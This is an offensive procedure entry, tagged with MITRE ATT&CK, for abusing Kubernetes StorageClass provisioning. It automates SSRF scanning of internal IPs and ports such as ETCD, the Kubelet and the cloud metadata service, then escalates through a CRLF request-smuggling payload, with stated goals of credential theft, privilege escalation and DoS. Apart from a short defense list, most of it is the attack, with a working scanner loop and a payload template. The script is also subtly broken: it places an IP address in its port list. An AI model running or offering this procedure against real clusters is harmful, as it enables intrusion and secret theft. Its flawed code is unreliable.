---
id: proc-k8s-automate-scan-escalate
tags:
  - ssrf
  - scanning
  - http-smuggling
  - automation
type: procedure
tools:
  - '[[tools/bash-scanner]]'
  - '[[tools/kubectl]]'
tactics:
  - '[[Discovery]]'
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Kubernetes
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Network Service Scanning]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:08:54.835Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Network Service Scanning]]'
  - '[[Exploit Public-Facing Application]]'
---
---

# Automate-Internal-Network-Scanning-and-Escalation

## Summary

This procedure uses a bash script to automate SSRF-based scanning of internal IPs and ports, then escalates to full SSRF via CRLF injection in Go <1.12 for arbitrary HTTP requests and response logging.

## Description

The script templates YAML for parallel workers (15 threads) targeting ranges like 172.16.0.0/12 on ports (2379 ETCD, 10255 Kubelet). For escalation, inject CRLF in resturl to smuggle requests (exploiting golang/go#30794), leaking full responses in accessible logs.

## Requirements

1. Bash environment with kubectl
2. Template YAML files (template_sc.yaml, template_pvc.yaml) with placeholders {{SC_NAME}}, {{URL}}, {{PVC_NAME}}
3. Access to kube-controller-manager logs for full SSRF
4. Kubernetes version <=1.15.3 with Go <1.12

## Defense

Defensive measures and detection strategies:

- Upgrade to Go 1.12+ to fix CRLF vuln
- Rotate logs and restrict access to controller-manager
- Rate-limit provisioning requests
- IDS on internal traffic from masters

## Objectives

1. Scan and enumerate internal services
2. Escalate half-blind to full SSRF
3. Achieve credential theft, priv esc, DoS

## Instructions

### Step 1: Prepare Scanner Script

**Context**: Create scanner.sh to loop over IPs/ports, update YAML, apply/delete resources.

**Command** (bash):
```bash
# scanner.sh excerpt:
for ip in 172.16.0.{1..255}; do
  for port in 2379 10255 169.254.169.254; do
    sed "s/{{URL}}/$ip:$port/g" template_sc.yaml | kubectl apply -f -
    kubectl create -f template_pvc.yaml
    sleep 10
    kubectl get events | grep provisioning
    kubectl delete pvc,pod,sc --all
  done
done
```

> Run with 15 parallel workers using xargs or GNU parallel.

### Step 2: Escalate with Smuggling

**Context**: Craft resturl for CRLF: 'http://target:port? HTTP/1.1\r\nHost: internal\r\n...'

**Command** ([[commands/kubectl-create-yaml]]):
```bash
# Update YAML with smuggling payload and apply
kubectl create -f smuggling-sc.yaml
```

> Expected output: Chained requests in logs, e.g., GET /pods from Kubelet.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]
- [[Execution]]

### Techniques

- [[Network Service Scanning]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/bash-scanner]]
- [[tools/kubectl]]

## Tags

- ssrf
- scanning
- http-smuggling
- automation

---
